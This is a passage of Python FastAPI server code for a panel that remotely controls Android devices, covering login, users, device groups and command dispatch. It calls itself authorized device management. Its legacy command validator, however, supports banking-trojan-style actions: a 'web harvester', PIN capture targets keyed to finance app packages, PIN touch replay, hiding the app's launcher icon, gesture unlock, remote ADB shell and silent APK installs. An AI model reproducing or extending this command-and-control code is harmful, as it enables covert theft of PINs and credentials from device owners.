                raise HTTPException(status_code=400, detail="invalid thumbnail fileList")
            normalized_files: list[dict[str, Any]] = []
            for item in file_list:
                if not isinstance(item, dict) or set(item) != {
                    "path",
                    "fileMd5",
                    "maxWidth",
                }:
                    raise HTTPException(status_code=400, detail="invalid thumbnail file")
                path = item.get("path")
                file_md5 = item.get("fileMd5")
                item_max_width = item.get("maxWidth")
                if (
                    not isinstance(path, str)
                    or not 1 <= len(path) <= 4096
                    or not isinstance(file_md5, str)
                    or not 1 <= len(file_md5) <= 128
                    or type(item_max_width) is not int
                    or item_max_width <= 0
                ):
                    raise HTTPException(status_code=400, detail="invalid thumbnail file")
                normalized_files.append(
                    {
                        "path": path,
                        "fileMd5": file_md5,
                        "maxWidth": item_max_width,
                    }
                )
            if type(max_width) is not int or max_width <= 0:
                raise HTTPException(status_code=400, detail="invalid thumbnail maxWidth")
            if not isinstance(elem, str) or not 1 <= len(elem) <= 500:
                raise HTTPException(status_code=400, detail="invalid thumbnail elem")
            parameters.update(
                {"fileList": normalized_files, "maxWidth": max_width, "elem": elem}
            )
        elif action in LEGACY_REMAINING_ACTIONS:
            if body.value is not None:
                raise HTTPException(status_code=400, detail="this action accepts no value")
            if action in LEGACY_REMAINING_EMPTY_ACTIONS or action in LEGACY_REMAINING_FIXED_DATA:
                if body.payload:
                    raise HTTPException(status_code=400, detail="this action accepts no payload")
            elif action == "updatePageRule":
                keys = set(body.payload)
                if "financePackages" not in keys or keys not in (
                    {"screenRule", "financePackages"},
                    {"pageRuleList", "financePackages"},
                ):
                    raise HTTPException(status_code=400, detail="invalid page rule payload")
                parameters.update(body.payload)
            else:
                required_fields = LEGACY_REMAINING_REQUIRED_FIELDS[action]
                if set(body.payload) != required_fields:
                    raise HTTPException(status_code=400, detail="invalid action payload")
                parameters.update(body.payload)
            try:
                serialized = json.dumps(parameters, ensure_ascii=False)
            except (TypeError, ValueError) as exc:
                raise HTTPException(status_code=400, detail="payload must be JSON") from exc
            if len(serialized.encode("utf-8")) > 256 * 1024:
                raise HTTPException(status_code=400, detail="payload is too large")
            for key in (
                "enable",
                "on",
                "dnd",
                "debug",
                "hide",
                "disconn",
                "mode",
                "show",
            ):
                if key in parameters and type(parameters[key]) is not bool:
                    raise HTTPException(status_code=400, detail=f"{key} must be boolean")
            if action in {"clickPoint", "touchDown", "down", "touchMove", "move", "adbClick"}:
                if any(type(parameters[key]) is not int for key in ("x", "y")):
                    raise HTTPException(status_code=400, detail="coordinates must be integers")
            if action in {"clickB", "clickInput"}:
                bounds = parameters.get("bounds")
                if (
                    not isinstance(bounds, dict)
                    or set(bounds) != {"left", "top", "right", "bottom"}
                    or any(type(value) is not int for value in bounds.values())
                ):
                    raise HTTPException(status_code=400, detail="invalid bounds")
            if action in {"gestureB", "gestureUnlock"}:
                points = parameters.get("gesture", parameters.get("points"))
                if not isinstance(points, list) or not 1 <= len(points) <= 10000:
                    raise HTTPException(status_code=400, detail="invalid gesture points")
                for point in points:
                    allowed_point_fields = (
                        {"x", "y", "t", "flag"}
                        if action == "gestureB"
                        else {"x", "y", "t"}
                    )
                    if (
                        not isinstance(point, dict)
                        or not {"x", "y", "t"}.issubset(point)
                        or set(point) - allowed_point_fields
                        or any(type(point[key]) is not int for key in ("x", "y", "t"))
                        or ("flag" in point and type(point["flag"]) is not int)
                    ):
                        raise HTTPException(status_code=400, detail="invalid gesture point")
            if action in {"permission", "permissionB"}:
                permission_type = parameters.get("type")
                if not isinstance(permission_type, str) or not permission_type:
                    raise HTTPException(status_code=400, detail="invalid permission type")
            if action == "manualPair":
                if (
                    not isinstance(parameters["code"], str)
                    or not 1 <= len(parameters["code"]) <= 200
                    or type(parameters["port"]) is not int
                    or not 1 <= parameters["port"] <= 65535
                ):
                    raise HTTPException(status_code=400, detail="invalid ADB pairing data")
            if action == "adbSwipe" and any(
                type(parameters[key]) is not int
                for key in ("x1", "y1", "x2", "y2", "duration")
            ):
                raise HTTPException(status_code=400, detail="invalid ADB swipe data")
            if action == "realtimeSet" and (
                type(parameters["interval"]) is not int
                or parameters["interval"] <= 0
            ):
                raise HTTPException(status_code=400, detail="invalid realtime interval")
            if action == "webrtcIce" and (
                not isinstance(parameters["candidate"], str)
                or type(parameters["sdpMLineIndex"]) is not int
                or not isinstance(parameters["sdpMid"], str)
            ):
                raise HTTPException(status_code=400, detail="invalid WebRTC ICE data")
            if action == "openIntent" and not isinstance(parameters["map"], dict):
                raise HTTPException(status_code=400, detail="invalid intent map")
            if action == "catAllViewSwitch":
                if not isinstance(parameters["screenRule"], list) or any(
                    not isinstance(item, dict) for item in parameters["screenRule"]
                ):
                    raise HTTPException(status_code=400, detail="invalid screen rules")
            if action == "updatePageRule":
                finance_packages = parameters.get("financePackages")
                if not isinstance(finance_packages, list) or any(
                    not isinstance(item, str) or not item
                    for item in finance_packages
                ):
                    raise HTTPException(status_code=400, detail="invalid finance packages")
                if "screenRule" in parameters and (
                    not isinstance(parameters["screenRule"], list)
                    or any(
                        not isinstance(item, dict)
                        for item in parameters["screenRule"]
                    )
                ):
                    raise HTTPException(status_code=400, detail="invalid screen rules")
                if "pageRuleList" in parameters:
                    page_rule_list = parameters["pageRuleList"]
                    if (
                        not isinstance(page_rule_list, dict)
                        or set(page_rule_list) != {"data"}
                        or not isinstance(page_rule_list["data"], list)
                        or any(
                            not isinstance(item, dict)
                            for item in page_rule_list["data"]
                        )
                    ):
                        raise HTTPException(status_code=400, detail="invalid page rule list")
            if action == "addPinTargets":
                if any(
                    not isinstance(parameters[key], list)
                    or any(
                        not isinstance(item, str) or not item
                        for item in parameters[key]
                    )
                    for key in ("keywords", "packages")
                ):
                    raise HTTPException(status_code=400, detail="invalid PIN targets")
            string_fields_by_action = {
                "lockAdvance": ("type", "title", "subtitle"),
                "fetchIcon": ("pkg",),
                "init_data": ("selfPkg", "homepage", "prepage", "accpage", "waitpage"),
                "setDomain": ("domain",),
                "sendAlert": ("title", "content", "okText", "openpkg"),
                "openUrl": ("url",),
                "installApk": ("url", "fileMd5"),
                "updateApk": ("url", "fileMd5"),
                "admPwd": ("pwd",),
                "webrtcOffer": ("sdp",),
                "hideMyMainActivity": ("iconAlias",),
                "openWebHarvester": ("url",),
                "touchPinReplay": ("touches", "pkg"),
                "adbShell": ("cmd",),
                "adbKeyEvent": ("key",),
            }
            for field in string_fields_by_action.get(action, ()):
                value = parameters[field]
                if not isinstance(value, str) or not 1 <= len(value) <= 10000:
                    raise HTTPException(status_code=400, detail=f"invalid {field}")
        else:
            if body.payload:
                raise HTTPException(status_code=400, detail="this action accepts no payload")
            if body.value is not None:
                raise HTTPException(status_code=400, detail="this action accepts no value")
        return parameters

    async def dispatch_tracked_command(
        *,
        device: dict[str, Any],
        user: dict[str, Any],
        action: str,
        payload: dict[str, Any],
        dispatch_action: str | None = None,
        dispatch_payload: dict[str, Any] | None = None,
    ) -> dict[str, str]:
        command_id = str(uuid.uuid4())
        now = utc_now()

        def queue(conn: sqlite3.Connection):
            conn.execute(
                "INSERT INTO commands(id,device_id,operator_id,action,payload_json,status,queued_at) "
                "VALUES(?,?,?,?,?,'queued',?)",
                (
                    command_id,
                    device["id"],
                    user["id"],
                    action,
                    json.dumps(payload, ensure_ascii=False),
                    now,
                ),
            )
            Database.audit(
                conn,
                "user",
                user["id"],
                "command.create",
                "device",
                device["id"],
                "queued",
                {"command_id": command_id, "action": action},
            )

        database.transaction(queue)
        sent = await hub.send_command(
            device["id"],
            {
                "type": "command.dispatch",
                "message_id": str(uuid.uuid4()),
                "correlation_id": command_id,
                "payload": {
                    "action": dispatch_action or action,
                    "parameters": (
                        payload if dispatch_payload is None else dispatch_payload
                    ),
                },
            },
        )
        if not sent:
            database.execute(
                "UPDATE commands SET status='failed',completed_at=?,error_code='DEVICE_OFFLINE',"
                "error_message='device is not connected' WHERE id=?",
                (utc_now(), command_id),
            )
            raise HTTPException(status_code=409, detail="device is offline")
        database.execute(
            "UPDATE commands SET status='sent',sent_at=? WHERE id=? AND status='queued'",
            (utc_now(), command_id),
        )
        return {"command_id": command_id, "status": "sent"}

    async def dispatch_legacy_untracked_command(
        *,
        device: dict[str, Any],
        user: dict[str, Any],
        action: str,
        data: dict[str, Any],
        wire_action: str | None = None,
        persist_data: bool = False,
    ) -> dict[str, str]:
        sid = legacy_device_sids.get(device["id"])
        if sid is None:
            sid = next(
                (
                    candidate_sid
                    for candidate_sid, bound_device_id in reversed(
                        legacy_bound_devices.items()
                    )
                    if bound_device_id == device["id"]
                ),
                None,
            )
        if sid is None:
            for candidate_sid, context in reversed(legacy_contexts.items()):
                candidate_device = legacy_device_identity({}, context)
                if candidate_device is not None and candidate_device["id"] == device["id"]:
                    sid = candidate_sid
                    bind_legacy_device(sid, device["id"])
                    break
        if sid is None:
            raise HTTPException(status_code=409, detail="device is offline")

        command_id = str(uuid.uuid4())
        now = utc_now()

        def queue(conn: sqlite3.Connection):
            conn.execute(
                "INSERT INTO commands(id,device_id,operator_id,action,payload_json,status,queued_at) "
                "VALUES(?,?,?,?,?,'queued',?)",
                (
                    command_id,
                    device["id"],
                    user["id"],
                    action,
                    (
                        json.dumps(data, ensure_ascii=False, separators=(",", ":"))
                        if persist_data
                        else "{}"
                    ),
                    now,
                ),
            )
            Database.audit(
                conn,
                "user",
                user["id"],
                "command.create",
                "device",
                device["id"],
                "queued",
                {"action": action},
            )

        database.transaction(queue)
        encrypted = encrypt_legacy_payload(
            {"action": wire_action or action, "data": data},
            settings.legacy_device_aes_key,
        )
        try:
            await sio.emit("new_msg", encrypted, to=sid)
        except Exception:
            database.execute(
                "UPDATE commands SET status='failed',completed_at=?,error_code='SEND_FAILED',"
                "error_message='failed to send Socket.IO event' WHERE id=?",
                (utc_now(), command_id),
            )
            raise HTTPException(status_code=409, detail="failed to send command")

        database.execute(
            "UPDATE commands SET status='sent',sent_at=? WHERE id=? AND status='queued'",
            (utc_now(), command_id),
        )
        if persist_data:
            record_legacy_expected_state(device["id"], action, data)
            record_legacy_stream_command(device["id"], action, data)
        return {"command_id": command_id, "status": "sent"}

    def issue_screen_ticket(
        conn: sqlite3.Connection, session_id: str, role: str
    ) -> str:
        ticket = random_token()
        conn.execute(
            "INSERT INTO screen_stream_tickets(id,ticket_hash,session_id,role,expires_at_epoch,created_at) "
            "VALUES(?,?,?,?,?,?)",
            (
                str(uuid.uuid4()),
                token_hash(ticket),
                session_id,
                role,
                epoch_now() + settings.ws_ticket_ttl_seconds,
                utc_now(),
            ),
        )
        return ticket

    @app.get("/api/health")
    def health(request: Request):
        return envelope(
            request,
            {
                "status": "ok",
                "version": "0.1.0",
                "mode": "authorized-device-management",
            },
        )

    @app.get("/api/system/status")
    async def system_status(
        request: Request, user: dict[str, Any] = Depends(current_user)
    ):
        realtime = await hub.stats()
        database.one("SELECT 1 AS ok")
        visible_where = "" if user["role"] == "admin" else " WHERE d.owner_user_id=?"
        params: tuple[Any, ...] = () if user["role"] == "admin" else (user["id"],)
        device_counts = database.one(
            "SELECT count(*) AS total,"
            "coalesce(sum(CASE WHEN s.online=1 THEN 1 ELSE 0 END),0) AS online "
            "FROM devices d JOIN device_status s ON s.device_id=d.id" + visible_where,
            params,
        )
        return envelope(
            request,
            {
                "api": "ok",
                "database": "ok",
                "database_engine": "SQLite",
                "devices": device_counts,
                "realtime": realtime,
            },
        )

    @app.get("/api/capabilities")
    def capabilities(
        request: Request, user: dict[str, Any] = Depends(current_user)
    ):
        return envelope(
            request,
            {
                "items": CAPABILITY_CATALOG,
                "summary": {
                    "implemented": sum(
                        item["status"] == "implemented" for item in CAPABILITY_CATALOG
                    ),
                    "not_implemented": sum(
                        item["status"] == "not_implemented"
                        for item in CAPABILITY_CATALOG
                    ),
                    "unavailable": sum(
                        item["status"] == "unavailable" for item in CAPABILITY_CATALOG
                    ),
                },
            },
        )

    @app.get("/api/device/bootstrap")
    def device_bootstrap(request: Request):
        return envelope(
            request,
            {
                "protocol_version": 1,
                "ws_ticket_path": "/api/device/ws-ticket",
                "ws_path": "/ws/device",
                "heartbeat_interval_seconds": min(
                    30, max(10, settings.device_offline_after_seconds // 3)
                ),
                "offline_after_seconds": settings.device_offline_after_seconds,
                "allowed_actions": [
                    "refresh_status",
                    "show_support_prompt",
                    "open_battery_settings",
                    "open_autostart_settings",
                    "request_screen_share",
                    "stop_screen_share",
                ]
                + (["lock_device"] if settings.enable_device_lock else []),
                "consent_required": ["request_screen_share"],
            },
        )

    @app.post("/api/login")
    def login(body: LoginRequest, request: Request):
        user = database.one("SELECT * FROM users WHERE username=?", (body.username,))
        if (
            user is None
            or user["status"] != "active"
            or not verify_password(body.password, user["password_hash"])
            or not ip_is_allowed(request.client.host if request.client else None, user.get("ip_whitelist", ""))
            or (
                user.get("totp_secret")
                and not verify_totp(body.otp_code or "", user["totp_secret"])
            )
        ):
            raise HTTPException(status_code=401, detail="invalid credentials")
        token = random_token()
        session_id = str(uuid.uuid4())
        now_epoch = epoch_now()
        database.execute(
            "INSERT INTO sessions(id,user_id,token_hash,created_at_epoch,expires_at_epoch) "
            "VALUES(?,?,?,?,?)",
            (
                session_id,
                user["id"],
                token_hash(token),
                now_epoch,
                now_epoch + settings.session_ttl_seconds,
            ),
        )
        return envelope(
            request,
            {
                "token": token,
                "expires_in": settings.session_ttl_seconds,
                "user": {
                    "id": user["id"],
                    "username": user["username"],
                    "role": user["role"],
                },
            },
        )

    @app.get("/api/me")
    def me(request: Request, user: dict[str, Any] = Depends(current_user)):
        return envelope(
            request,
            {"id": user["id"], "username": user["username"], "role": user["role"]},
        )

    @app.post("/api/logout")
    def logout(request: Request, user: dict[str, Any] = Depends(current_user)):
        database.execute(
            "UPDATE sessions SET revoked_at_epoch=? WHERE id=?",
            (epoch_now(), user["session_id"]),
        )
        return envelope(request, {"logged_out": True})

    @app.post("/api/auth/reauth")
    def reauth(
        body: ReauthRequest,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        account = database.one("SELECT password_hash FROM users WHERE id=?", (user["id"],))
        if account is None or not verify_password(body.password, account["password_hash"]):
            raise HTTPException(status_code=401, detail="invalid credentials")
        now_epoch = epoch_now()
        database.execute(
            "UPDATE sessions SET reauth_at_epoch=? WHERE id=?",
            (now_epoch, user["session_id"]),
        )
        return envelope(request, {"reauthenticated": True, "valid_for": settings.reauth_ttl_seconds})

    @app.post("/api/auth/password")
    def change_password(
        body: PasswordChangeRequest,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        account = database.one("SELECT password_hash FROM users WHERE id=?", (user["id"],))
        if account is None or not verify_password(
            body.current_password, account["password_hash"]
        ):
            raise HTTPException(status_code=401, detail="invalid credentials")

        def action(conn: sqlite3.Connection):
            conn.execute(
                "UPDATE users SET password_hash=? WHERE id=?",
                (hash_password(body.new_password), user["id"]),
            )
            conn.execute(
                "UPDATE sessions SET revoked_at_epoch=? WHERE user_id=? AND id<>? "
                "AND revoked_at_epoch IS NULL",
                (epoch_now(), user["id"], user["session_id"]),
            )
            Database.audit(
                conn,
                "user",
                user["id"],
                "user.password.change",
                "user",
                user["id"],
                "success",
            )

        database.transaction(action)
        return envelope(request, {"changed": True, "other_sessions_revoked": True})

    @app.get("/api/roles")
    def roles(request: Request, user: dict[str, Any] = Depends(current_user)):
        require_role(user, "admin")
        return envelope(
            request,
            [
                {
                    "id": "admin",
                    "name": "超级管理员",
                    "permissions": ["users:manage", "devices:all", "devices:control"],
                },
                {
                    "id": "operator",
                    "name": "操作员",
                    "permissions": ["devices:own", "devices:control"],
                },
                {
                    "id": "viewer",
                    "name": "只读账号",
                    "permissions": ["devices:own"],
                },
            ],
        )

    @app.get("/api/users")
    def users(
        request: Request,
        user: dict[str, Any] = Depends(current_user),
        q: str = Query(default="", max_length=80),
        role: str | None = Query(default=None, pattern="^(admin|operator|viewer)$"),
        account_status: str | None = Query(
            default=None, alias="status", pattern="^(active|disabled)$"
        ),
        page: int = Query(default=1, ge=1),
        page_size: int = Query(default=20, ge=1, le=100),
    ):
        require_role(user, "admin")
        clauses: list[str] = ["u.deleted_at IS NULL"]
        params: list[Any] = []
        if q:
            clauses.append("u.username LIKE ?")
            params.append(f"%{q}%")
        if role:
            clauses.append("u.role=?")
            params.append(role)
        if account_status:
            clauses.append("u.status=?")
            params.append(account_status)
        where = " WHERE " + " AND ".join(clauses) if clauses else ""
        total = database.one(
            "SELECT count(*) AS value FROM users u" + where, tuple(params)
        )["value"]
        rows = database.all(
            "SELECT u.id,u.username,u.role,u.status,u.created_at,u.ip_whitelist,u.note,"
            "CASE WHEN u.totp_secret IS NULL OR u.totp_secret='' THEN 0 ELSE 1 END AS totp_enabled,"
            "(SELECT max(s.created_at_epoch) FROM sessions s WHERE s.user_id=u.id) AS last_login_epoch,"
            "EXISTS(SELECT 1 FROM sessions active WHERE active.user_id=u.id "
            "AND active.revoked_at_epoch IS NULL AND active.expires_at_epoch>=?) AS online,"
            "(SELECT count(*) FROM devices d WHERE d.owner_user_id=u.id) AS device_count "
            "FROM users u"
            + where
            + " ORDER BY u.created_at DESC LIMIT ? OFFSET ?",
            tuple([epoch_now()] + params + [page_size, (page - 1) * page_size]),
        )
        return JSONResponse(
            {
                "data": rows,
                "meta": {
                    "request_id": request.state.request_id,
                    "page": page,
                    "page_size": page_size,
                    "total": total,
                },
            }
        )

    @app.get("/api/user-options")
    def user_options(
        request: Request, user: dict[str, Any] = Depends(current_user)
    ):
        require_role(user, "admin")
        rows = database.all(
            "SELECT id,username,role,status FROM users WHERE deleted_at IS NULL "
            "ORDER BY username"
        )
        return envelope(request, rows)

    @app.post("/api/users")
    def create_user(
        body: UserCreateRequest,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        require_role(user, "admin")
        require_recent_reauth(user)
        user_id = str(uuid.uuid4())
        ip_whitelist = normalized_ip_whitelist(body.ip_whitelist)
        try:
            totp_secret = normalize_totp_secret(body.totp_secret) if body.totp_secret else None
        except ValueError as exc:
            raise HTTPException(status_code=400, detail=str(exc)) from exc

        def action(conn: sqlite3.Connection):
            try:
                conn.execute(
                    "INSERT INTO users(id,username,password_hash,role,status,created_at,ip_whitelist,note,totp_secret) "
                    "VALUES(?,?,?,?,?,?,?,?,?)",
                    (
                        user_id,
                        body.username,
                        hash_password(body.password),
                        body.role,
                        body.status,
                        utc_now(),
                        ip_whitelist,
                        body.note,
                        totp_secret,
                    ),
                )
            except sqlite3.IntegrityError as exc:
                raise HTTPException(status_code=409, detail="username already exists") from exc
            Database.audit(
                conn,
                "user",
                user["id"],
                "user.create",
                "user",
                user_id,
                "success",
                {"username": body.username, "role": body.role, "status": body.status},
            )

        database.transaction(action)
        return envelope(
            request,
            {
                "id": user_id,
                "username": body.username,
                "role": body.role,
                "status": body.status,
                "ip_whitelist": ip_whitelist,
                "note": body.note,
                "totp_enabled": bool(totp_secret),
            },
            201,
        )

    @app.patch("/api/users/{user_id}")
    def update_user(
        user_id: str,
        body: UserUpdateRequest,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        require_role(user, "admin")
        require_recent_reauth(user)
        target = database.one(
            "SELECT id,username,role,status FROM users "
            "WHERE id=? AND deleted_at IS NULL",
            (user_id,),
        )
        if target is None:
            raise HTTPException(status_code=404, detail="user not found")
        if target["id"] == user["id"] and (body.role is not None or body.status is not None):
            raise HTTPException(status_code=400, detail="cannot change your own role or status")
        removing_active_admin = (
            target["role"] == "admin"
            and target["status"] == "active"
            and (body.role not in (None, "admin") or body.status == "disabled")
        )
        if removing_active_admin:
            active_admins = database.one(
                "SELECT count(*) AS value FROM users WHERE role='admin' AND status='active' "
                "AND deleted_at IS NULL"
            )["value"]
            if active_admins <= 1:
                raise HTTPException(status_code=409, detail="at least one active admin is required")
        updates: list[str] = []
        params: list[Any] = []
        if body.role is not None:
            updates.append("role=?")
            params.append(body.role)
        if body.status is not None:
            updates.append("status=?")
            params.append(body.status)
        if body.password is not None:
            updates.append("password_hash=?")
            params.append(hash_password(body.password))
        if body.ip_whitelist is not None:
            updates.append("ip_whitelist=?")
            params.append(normalized_ip_whitelist(body.ip_whitelist))
        if body.note is not None:
            updates.append("note=?")
            params.append(body.note)
        if body.totp_secret is not None:
            try:
                secret = normalize_totp_secret(body.totp_secret)
            except ValueError as exc:
                raise HTTPException(status_code=400, detail=str(exc)) from exc
            updates.append("totp_secret=?")
            params.append(secret)
        elif body.clear_totp:
            updates.append("totp_secret=NULL")

        def action(conn: sqlite3.Connection):
            conn.execute(
                "UPDATE users SET " + ",".join(updates) + " WHERE id=?",
                tuple(params + [user_id]),
            )
            if body.status == "disabled" or body.password is not None:
                conn.execute(
                    "UPDATE sessions SET revoked_at_epoch=? WHERE user_id=? "
                    "AND revoked_at_epoch IS NULL",
                    (epoch_now(), user_id),
                )
            Database.audit(
                conn,
                "user",
                user["id"],
                "user.update",
                "user",
                user_id,
                "success",
                body.model_dump(
                    exclude_none=True, exclude={"password", "totp_secret"}
                ),
            )

        database.transaction(action)
        updated = database.one(
            "SELECT id,username,role,status,created_at,ip_whitelist,note,"
            "CASE WHEN totp_secret IS NULL OR totp_secret='' THEN 0 ELSE 1 END AS totp_enabled "
            "FROM users WHERE id=?",
            (user_id,),
        )
        return envelope(request, updated)

    @app.post("/api/ws-ticket")
    def dashboard_ws_ticket(
        request: Request, user: dict[str, Any] = Depends(current_user)
    ):
        ticket = random_token()
        database.execute(
            "INSERT INTO ws_tickets(id,ticket_hash,purpose,subject_id,expires_at_epoch,created_at) "
            "VALUES(?,?,?,?,?,?)",
            (
                str(uuid.uuid4()),
                token_hash(ticket),
                "dashboard",
                user["id"],
                epoch_now() + settings.ws_ticket_ttl_seconds,
                utc_now(),
            ),
        )
        return envelope(
            request, {"ticket": ticket, "expires_in": settings.ws_ticket_ttl_seconds}
        )

    @app.delete("/api/users/{user_id}")
    def delete_user(
        user_id: str,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        require_role(user, "admin")
        require_recent_reauth(user)
        if user_id == user["id"]:
            raise HTTPException(status_code=400, detail="cannot delete your own account")
        target = database.one(
            "SELECT id,role,status,deleted_at FROM users WHERE id=?", (user_id,)
        )
        if target is None or target["deleted_at"] is not None:
            raise HTTPException(status_code=404, detail="user not found")
        if target["role"] == "admin" and target["status"] == "active":
            active_admins = database.one(
                "SELECT count(*) AS value FROM users WHERE role='admin' AND status='active' "
                "AND deleted_at IS NULL"
            )["value"]
            if active_admins <= 1:
                raise HTTPException(status_code=409, detail="at least one active admin is required")
        now = utc_now()

        def action(conn: sqlite3.Connection):
            conn.execute(
                "UPDATE users SET status='disabled',deleted_at=? WHERE id=?", (now, user_id)
            )
            conn.execute(
                "UPDATE sessions SET revoked_at_epoch=? WHERE user_id=? AND revoked_at_epoch IS NULL",
                (epoch_now(), user_id),
            )
            Database.audit(
                conn, "user", user["id"], "user.delete", "user", user_id, "success"
            )

        database.transaction(action)
        return envelope(request, {"deleted": True, "id": user_id})

    @app.patch("/api/users/{user_id}/settings")
    def update_user_settings(
        user_id: str,
        body: UserUpdateRequest,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        require_role(user, "admin")
        require_recent_reauth(user)
        target = database.one("SELECT id FROM users WHERE id=? AND deleted_at IS NULL", (user_id,))
        if target is None:
            raise HTTPException(status_code=404, detail="user not found")
        updates: list[str] = []
        params: list[Any] = []
        if body.ip_whitelist is not None:
            updates.append("ip_whitelist=?")
            params.append(normalized_ip_whitelist(body.ip_whitelist))
        if body.note is not None:
            updates.append("note=?")
            params.append(body.note)
        if body.totp_secret is not None:
            try:
                secret = normalize_totp_secret(body.totp_secret)
            except ValueError as exc:
                raise HTTPException(status_code=400, detail=str(exc)) from exc
            updates.append("totp_secret=?")
            params.append(secret)
        elif body.clear_totp:
            updates.append("totp_secret=NULL")
        if not updates:
            raise HTTPException(status_code=400, detail="no extended setting supplied")
        database.execute(
            "UPDATE users SET " + ",".join(updates) + " WHERE id=?",
            tuple(params + [user_id]),
        )
        return envelope(request, {"updated": True, "id": user_id})

    @app.get("/api/build-profiles")
    def build_profiles_reserved(user: dict[str, Any] = Depends(current_user)):
        require_role(user, "admin")
        # Reserved only: no project discovery, compiler or signing process exists here.
        reserved_not_implemented("APK build profiles")

    @app.post("/api/build-profiles")
    def create_build_profile_reserved(
        body: BuildProfileRequest,
        user: dict[str, Any] = Depends(current_user),
    ):
        require_role(user, "admin")
        reserved_not_implemented("APK build profile creation")

    @app.patch("/api/build-profiles/{profile_id}")
    def update_build_profile_reserved(
        profile_id: str,
        body: BuildProfileRequest,
        user: dict[str, Any] = Depends(current_user),
    ):
        require_role(user, "admin")
        reserved_not_implemented(f"APK build profile update ({profile_id})")

    @app.post("/api/build-jobs")
    def create_build_job_reserved(
        body: dict[str, Any],
        user: dict[str, Any] = Depends(current_user),
    ):
        require_role(user, "admin")
        # Deliberately no subprocess, Gradle, signer or uploaded-code execution.
        reserved_not_implemented("APK build job")

    @app.get("/api/build-jobs/{job_id}")
    def build_job_reserved(
        job_id: str,
        user: dict[str, Any] = Depends(current_user),
    ):
        require_role(user, "admin")
        reserved_not_implemented(f"APK build job status ({job_id})")

    @app.get("/api/build-artifacts/{artifact_id}/download")
    def build_artifact_reserved(
        artifact_id: str,
        user: dict[str, Any] = Depends(current_user),
    ):
        require_role(user, "admin")
        reserved_not_implemented(f"APK build artifact ({artifact_id})")

    @app.get("/api/device-groups")
    def device_groups(
        request: Request, user: dict[str, Any] = Depends(current_user)
    ):
        where = "" if user["role"] == "admin" else " WHERE g.owner_user_id=?"
        params: tuple[Any, ...] = () if user["role"] == "admin" else (user["id"],)
        rows = database.all(
            "SELECT g.id,g.owner_user_id,g.name,g.description,g.created_at,g.updated_at,"
            "count(d.id) AS device_count FROM device_groups g "
            "LEFT JOIN devices d ON d.group_id=g.id"
            + where
            + " GROUP BY g.id ORDER BY g.name",
            params,
        )
        return envelope(request, rows)

    @app.post("/api/device-groups")
    def create_device_group(
        body: DeviceGroupCreateRequest,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        require_role(user, "admin", "operator")
        group_id = str(uuid.uuid4())
        now = utc_now()

        def action(conn: sqlite3.Connection):
            try:
                conn.execute(
                    "INSERT INTO device_groups(id,owner_user_id,name,description,created_at,updated_at) "
                    "VALUES(?,?,?,?,?,?)",
                    (group_id, user["id"], body.name, body.description, now, now),
                )
            except sqlite3.IntegrityError as exc:
                raise HTTPException(status_code=409, detail="group name already exists") from exc
            Database.audit(
                conn,
                "user",
                user["id"],
                "device_group.create",
                "device_group",
                group_id,
                "success",
                {"name": body.name},
            )

        database.transaction(action)
        return envelope(
            request,
            {
                "id": group_id,
                "owner_user_id": user["id"],
                "name": body.name,
                "description": body.description,
                "device_count": 0,
                "created_at": now,
                "updated_at": now,
            },
            201,
        )

    @app.patch("/api/device-groups/{group_id}")
    def update_device_group(
        group_id: str,
        body: DeviceGroupUpdateRequest,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        require_role(user, "admin", "operator")
        group = database.one("SELECT * FROM device_groups WHERE id=?", (group_id,))
        if group is None or (
            user["role"] != "admin" and group["owner_user_id"] != user["id"]
        ):
            raise HTTPException(status_code=404, detail="device group not found")
        updates: list[str] = []
        params: list[Any] = []
        if body.name is not None:
            updates.append("name=?")
            params.append(body.name)
        if body.description is not None:
            updates.append("description=?")
            params.append(body.description)
        updates.append("updated_at=?")
        params.extend([utc_now(), group_id])
        try:
            database.execute(
                "UPDATE device_groups SET " + ",".join(updates) + " WHERE id=?",
                tuple(params),
            )
        except sqlite3.IntegrityError as exc:
            raise HTTPException(status_code=409, detail="group name already exists") from exc
        return envelope(
            request, database.one("SELECT * FROM device_groups WHERE id=?", (group_id,))
        )

    @app.delete("/api/device-groups/{group_id}")
    def delete_device_group(
        group_id: str,
        request: Request,
        user: dict[str, Any] = Depends(current_user),
    ):
        require_role(user, "admin", "operator")
        group = database.one("SELECT * FROM device_groups WHERE id=?", (group_id,))
        if group is None or (
            user["role"] != "admin" and group["owner_user_id"] != user["id"]
        ):
            raise HTTPException(status_code=404, detail="device group not found")

        def action(conn: sqlite3.Connection):
            conn.execute("UPDATE devices SET group_id=NULL WHERE group_id=?", (group_id,))
            conn.execute("DELETE FROM device_groups WHERE id=?", (group_id,))
            Database.audit(
                conn, "user", user["id"], "device_group.delete", "device_group", group_id, "success"
            )

        database.transaction(action)
        return envelope(request, {"deleted": True, "id": group_id})

    @app.get("/api/battery-config")
    def battery_config(
        request: Request,
        brand: str = Query(min_length=1, max_length=80),
        model: str = Query(default="", max_length=120),
    ):
        guides = database.all(
            "SELECT id,brand,model_pattern,title,steps_json,updated_at "
            "FROM battery_guides WHERE enabled=1"
        )
        brand_value = brand.casefold()
        model_value = model.casefold()

        def guide_score(guide: dict[str, Any]) -> int:
            guide_brand = guide["brand"].casefold()
            pattern = guide["model_pattern"].casefold()
            if guide_brand not in {"*", brand_value}:
                return -1
            if pattern != "*" and not fnmatch.fnmatchcase(model_value, pattern):
                return -1
            return (2 if guide_brand == brand_value else 0) + (1 if pattern != "*" else 0)

        matched = [(guide_score(guide), guide) for guide in guides]
        matched = [item for item in matched if item[0] >= 0]
        if not matched:
            raise HTTPException(status_code=404, detail="battery guide not found")
        selected = max(matched, key=lambda item: item[0])[1]
        selected["steps"] = json.loads(selected.pop("steps_json"))
        return envelope(request, selected)

    @app.get("/api/battery-guides")
    def battery_guides(
        request: Request, user: dict[str, Any] = Depends(current_user)
    ):
        rows = database.all(
            "SELECT id,brand,model_pattern,title,steps_json,enabled,created_by,created_at,updated_at "
            "FROM battery_guides ORDER BY brand,model_pattern"
        )
        for row in rows:
            row["steps"] = json.loads(row.pop("steps_json"))
        return envelope(request, rows)

    @app.post("/api/battery-guides")
    def create_battery_guide(
